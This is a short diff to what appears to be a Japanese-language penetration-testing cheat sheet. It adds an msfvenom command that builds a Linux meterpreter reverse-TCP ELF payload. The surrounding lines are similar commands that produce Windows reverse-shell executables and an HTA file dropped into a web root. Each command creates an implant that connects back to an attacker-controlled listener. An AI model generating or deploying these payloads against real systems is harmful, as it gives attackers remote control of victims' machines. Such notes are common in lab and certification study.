@@ -52,3 +52,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.18.86.217 LPORT=4444 -f exe > ete
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
 ```
 
+### elfファイル
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.153 LPORT=443 -f elf > shell.elf
+```
+
